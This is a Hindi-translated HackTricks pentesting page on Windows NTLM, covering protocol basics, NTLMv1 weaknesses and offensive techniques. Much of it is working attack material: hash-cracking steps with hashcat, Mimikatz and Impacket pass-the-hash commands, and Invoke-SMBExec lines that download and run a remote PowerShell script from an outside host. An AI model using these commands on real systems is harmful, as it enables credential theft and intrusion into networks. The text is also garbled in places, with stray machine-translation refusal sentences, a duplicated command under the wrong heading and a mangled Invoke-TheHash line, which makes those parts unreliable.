# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **Twitter पर** मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **hacktricks repo में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें** और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## मूल जानकारी

**NTLM Credentials**: डोमेन नाम (यदि कोई हो), उपयोगकर्ता नाम और पासवर्ड हैश.

**LM** केवल **Windows XP और सर्वर 2003** में **सक्षम** है (LM हैशेज को क्रैक किया जा सकता है). LM हैश AAD3B435B51404EEAAD3B435B51404EE का मतलब है कि LM का उपयोग नहीं किया जा रहा है (यह खाली स्ट्रिंग का LM हैश है).

डिफ़ॉल्ट रूप से **Kerberos** का **उपयोग किया जाता है**, इसलिए NTLM केवल तब उपयोग किया जाएगा जब **कोई Active Directory कॉन्फ़िगर नहीं की गई हो,** **डोमेन मौजूद न हो**, **Kerberos काम नहीं कर रहा हो** (खराब कॉन्फ़िगरेशन) या **क्लाइंट** वैध होस्ट-नाम के बजाय IP का उपयोग करके कनेक्ट करने की कोशिश करता है.

**NTLM प्रमाणीकरण** के **नेटवर्क पैकेट्स** में "**NTLMSSP**" **हेडर** होता है.

प्रोटोकॉल: LM, NTLMv1 और NTLMv2 %windir%\Windows\System32\msv1\_0.dll में समर्थित हैं

## LM, NTLMv1 और NTLMv2

आप जांच सकते हैं और कॉन्फ़िगर कर सकते हैं कि कौन सा प्रोटोकॉल उपयोग किया जाएगा:

### GUI

_secpol.msc_ निष्पादित करें -> स्थानीय नीतियाँ -> सुरक्षा विकल्प -> नेटवर्क सुरक्षा: LAN मैनेजर प्रमाणीकरण स्तर. यहाँ 6 स्तर हैं (0 से 5 तक).

![](<../../.gitbook/assets/image (92).png>)

### रजिस्ट्री

यह स्तर 5 सेट करेगा:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
संभावित मान:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## बेसिक NTLM डोमेन प्रमाणीकरण योजना

1. **उपयोगकर्ता** अपने **प्रमाण-पत्र** प्रस्तुत करता है
2. क्लाइंट मशीन **प्रमाणीकरण अनुरोध भेजती है**, **डोमेन नाम** और **उपयोगकर्ता नाम** सहित
3. **सर्वर** **चुनौती** भेजता है
4. **क्लाइंट** पासवर्ड के हैश का उपयोग करके **चुनौती को एन्क्रिप्ट** करता है और उसे प्रतिक्रिया के रूप में भेजता है
5. **सर्वर**, **डोमेन कंट्रोलर** को **डोमेन नाम, उपयोगकर्ता नाम, चुनौती और प्रतिक्रिया** भेजता है। यदि Active Directory कॉन्फ़िगर नहीं किया गया है या डोमेन नाम सर्वर का नाम है, तो प्रमाण-पत्र **स्थानीय रूप से जांचे जाते हैं**।
6. **डोमेन कंट्रोलर जांचता है कि सब कुछ सही है** और सर्वर को जानकारी भेजता है

**सर्वर** और **डोमेन कंट्रोलर** **Netlogon** सर्वर के माध्यम से **सुरक्षित चैनल** बना सकते हैं क्योंकि डोमेन कंट्रोलर को सर्वर का पासवर्ड पता होता है (यह **NTDS.DIT** डेटाबेस के अंदर होता है)।

### लोकल NTLM प्रमाणीकरण योजना

प्रमाणीकरण वही है जैसा कि **पहले उल्लेखित है** लेकिन **सर्वर** को **उपयोगकर्ता के हैश** का पता होता है जो **SAM** फाइल में प्रमाणीकरण की कोशिश करता है। इसलिए, डोमेन कंट्रोलर से पूछने के बजाय, **सर्वर स्वयं जांच करेगा** कि क्या उपयोगकर्ता प्रमाणीकरण कर सकता है।

### NTLMv1 चुनौती

**चुनौती की लंबाई 8 बाइट्स** होती है और **प्रतिक्रिया 24 बाइट्स** लंबी होती है।

**हैश NT (16बाइट्स)** को **3 भागों में 7बाइट्स प्रत्येक** में विभाजित किया जाता है (7B + 7B + (2B+0x00\*5)): **अंतिम भाग को शून्य से भरा जाता है**। फिर, **चुनौती** को प्रत्येक भाग के साथ **अलग-अलग सिफर** किया जाता है और **परिणामी** सिफर किए गए बाइट्स को **जोड़ा** जाता है। कुल: 8B + 8B + 8B = 24Bytes।

**समस्याएं**:

* **रैंडमनेस की कमी**
* 3 भागों को **अलग-अलग हमला** किया जा सकता है NT हैश पाने के लिए
* **DES को क्रैक किया जा सकता है**
* तीसरी कुंजी हमेशा **5 शून्यों** से बनी होती है।
* यदि **एक ही चुनौती** दी जाती है तो **प्रतिक्रिया** भी **वही** होगी। इसलिए, आप **चुनौती** के रूप में पीड़ित को "**1122334455667788**" का स्ट्रिंग दे सकते हैं और **पूर्वनिर्मित रेनबो टेबल्स** का उपयोग करके प्रतिक्रिया पर हमला कर सकते हैं।

### NTLMv1 हमला

आजकल Unconstrained Delegation कॉन्फ़िगर किए गए वातावरणों को पाना कम हो रहा है, लेकिन इसका यह मतलब नहीं है कि आप **Print Spooler सेवा का दुरुपयोग नहीं कर सकते**।

आप AD पर पहले से ही हासिल किए गए कुछ प्रमाण-पत्र/सत्रों का उपयोग करके **प्रिंटर से किसी ऐसे होस्ट के खिलाफ प्रमाणीकरण करने के लिए कह सकते हैं** जो आपके नियंत्रण में हो। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का उपयोग करके आप **प्रमाणीकरण चुनौती को 1122334455667788 पर सेट कर सकते हैं**, प्रमाणीकरण प्रयास को कैप्चर कर सकते हैं, और यदि यह **NTLMv1** का उपयोग करके किया गया था तो आप इसे **क्रैक कर सकते हैं**।\
यदि आप `responder` का उपयोग कर रहे हैं तो आप **प्रमाणीकरण को डाउनग्रेड** करने के लिए `--lm` फ्लैग का **उपयोग करने की कोशिश कर सकते हैं**।\
_ध्यान दें कि इस तकनीक के लिए प्रमाणीकरण NTLMv1 का उपयोग करके किया जाना चाहिए (NTLMv2 मान्य नहीं है)।_

याद रखें कि प्रिंटर प्रमाणीकरण के दौरान कंप्यूटर खाते का उपयोग करेगा, और कंप्यूटर खाते **लंबे और यादृच्छिक पासवर्ड** का उपयोग करते हैं जिन्हें आप सामान्य **शब्दकोशों** का उपयोग करके **शायद क्रैक नहीं कर पाएंगे**। लेकिन **NTLMv1** प्रमाणीकरण **DES का उपयोग करता है** ([यहां अधिक जानकारी](./#ntlmv1-challenge)), इसलिए DES को क्रैक करने के लिए विशेष रूप से समर्पित कुछ सेवाओं का उपयोग करके आप इसे क्रैक कर पाएंगे (उदाहरण के लिए आप [https://crack.sh/](https://crack.sh) का उपयोग कर सकते हैं)।

### NTLMv1 हमला hashcat के साथ

NTLMv1 को NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) का उपयोग करके भी तोड़ा जा सकता है जो NTLMv1 संदेशों को ऐसे तरीके से प्रारूपित करता है जिसे hashcat के साथ तोड़ा जा सकता है।

कमांड
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
यह नीचे दिया गया होगा:
```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
एक फाइल बनाएं जिसमें निम्नलिखित सामग्री हो:
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
```
hashcat को चलाएं (hashtopolis जैसे उपकरण के माध्यम से वितरित करना सबसे अच्छा है) क्योंकि अन्यथा इसमें कई दिन लगेंगे।
```
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
इस मामले में हम जानते हैं कि इसका पासवर्ड password है इसलिए हम डेमो के उद्देश्य से चीट करने वाले हैं:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
हमें अब hashcat-utilities का उपयोग करके क्रैक किए गए des keys को NTLM हैश के हिस्सों में परिवर्तित करने की आवश्यकता है:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Since the provided text is not visible, I'm unable to translate it. Please provide the text you want to be translated into Hindi, and I'll be happy to assist you.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
To provide an accurate translation, I need the specific English text from the file `windows-hardening/ntlm/README.md` that you want to be translated into Hindi. Please provide the text, and I will translate it for you while maintaining the markdown and HTML syntax.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 चैलेंज

**चैलेंज की लंबाई 8 बाइट्स है** और **2 प्रतिक्रियाएं भेजी जाती हैं**: एक **24 बाइट्स** लंबी होती है और **दूसरी** की लंबाई **परिवर्तनशील** होती है।

**पहली प्रतिक्रिया** **HMAC\_MD5** का उपयोग करके **स्ट्रिंग** को एन्क्रिप्ट करके बनाई जाती है जो **क्लाइंट और डोमेन** द्वारा बनाई गई होती है और **की** के रूप में **NT हैश** का **MD4 हैश** उपयोग किया जाता है। फिर, **परिणाम** को **की** के रूप में उपयोग करके **HMAC\_MD5** का उपयोग करके **चैलेंज** को एन्क्रिप्ट किया जाएगा। इसमें, **8 बाइट्स का एक क्लाइंट चैलेंज जोड़ा जाएगा**। कुल: 24 B।

**दूसरी प्रतिक्रिया** **कई मानों** का उपयोग करके बनाई जाती है (एक नया क्लाइंट चैलेंज, एक **टाइमस्टैम्प** **रिप्ले अटैक्स** से बचने के लिए...)

यदि आपके पास एक **pcap है जिसमें सफल प्रमाणीकरण प्रक्रिया को कैप्चर किया गया है**, तो आप इस गाइड का पालन करके डोमेन, उपयोगकर्ता नाम, चैलेंज और प्रतिक्रिया प्राप्त कर सकते हैं और पासवर्ड को क्रैक करने की कोशिश कर सकते हैं: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**एक बार जब आपके पास पीड़ित का हैश हो**, तो आप इसका उपयोग उसकी नकल करने के लिए कर सकते हैं।\
आपको एक **टूल** का उपयोग करना होगा जो **NTLM प्रमाणीकरण को उस हैश का उपयोग करके प्रदर्शन करेगा**, **या** आप एक नया **sessionlogon** बना सकते हैं और उस **हैश** को **LSASS** के अंदर **इंजेक्ट** कर सकते हैं, ताकि जब भी कोई **NTLM प्रमाणीकरण किया जाता है**, वह **हैश उपयोग किया जाएगा।** आखिरी विकल्प वह है जो mimikatz करता है।

**कृपया, याद रखें कि आप Pass-the-Hash हमले कंप्यूटर खातों का उपयोग करके भी कर सकते हैं।**

### **Mimikatz**

**इसे एडमिनिस्ट्रेटर के रूप में चलाने की आवश्यकता है**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
```markdown
यह एक प्रक्रिया शुरू करेगा जो उन उपयोगकर्ताओं के अंतर्गत आती है जिन्होंने mimikatz लॉन्च किया है, लेकिन LSASS में इंटरनली सहेजे गए क्रेडेंशियल्स वे होते हैं जो mimikatz पैरामीटर्स के अंदर होते हैं। फिर, आप नेटवर्क संसाधनों तक पहुँच सकते हैं जैसे कि आप वह उपयोगकर्ता हों (runas /netonly ट्रिक के समान लेकिन आपको प्लेन-टेक्स्ट पासवर्ड जानने की आवश्यकता नहीं है)।

### लिनक्स से Pass-the-Hash

आप लिनक्स से Pass-the-Hash का उपयोग करके Windows मशीनों में कोड निष्पादन प्राप्त कर सकते हैं।\
[**यहाँ जानें कि यह कैसे करें।**](../../windows/ntlm/broken-reference/)

### Impacket Windows संकलित उपकरण

आप[ यहाँ से Windows के लिए impacket बाइनरीज़ डाउनलोड कर सकते हैं](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)।

* **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (इस मामले में आपको एक कमांड निर्दिष्ट करने की आवश्यकता है, cmd.exe और powershell.exe इंटरैक्टिव शेल प्राप्त करने के लिए मान्य नहीं हैं)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Impacket बाइनरीज़ के कई और भी हैं...

### Invoke-TheHash

आप यहाँ से powershell स्क्रिप्ट्स प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum का प्रयोग
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

यह फ़ंक्शन **सभी अन्य का मिश्रण** है। आप **कई होस्ट्स** पास कर सकते हैं, कुछ को **बाहर कर सकते हैं** और जो **विकल्प** आप उपयोग करना चाहते हैं उसे **चुन सकते हैं** (_SMBExec, WMIExec, SMBClient, SMBEnum_)। यदि आप **SMBExec** और **WMIExec** में से **कोई भी** चुनते हैं लेकिन कोई _**Command**_ पैरामीटर नहीं देते हैं तो यह केवल **जांच** करेगा कि क्या आपके पास **पर्याप्त अनुमतियां** हैं।
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**इसे एडमिनिस्ट्रेटर के रूप में चलाने की आवश्यकता है**

यह टूल mimikatz के समान कार्य करेगा (LSASS मेमोरी में संशोधन करेगा)।
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### यूजरनेम और पासवर्ड के साथ मैनुअल विंडोज रिमोट एक्जीक्यूशन

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## विंडोज होस्ट से क्रेडेंशियल्स निकालना

**विंडोज होस्ट से क्रेडेंशियल्स प्राप्त करने के बारे में अधिक जानकारी के लिए आपको इस पेज को पढ़ना चाहिए।**

## NTLM रिले और रिस्पॉन्डर

**इन हमलों को कैसे करें, इस पर अधिक विस्तृत गाइड के लिए यहाँ पढ़ें:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## नेटवर्क कैप्चर से NTLM चैलेंजेस पार्स करना

**आप इसका उपयोग कर सकते हैं** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, hacktricks repo** और **hacktricks-cloud repo** में PRs सबमिट करके।

</details>
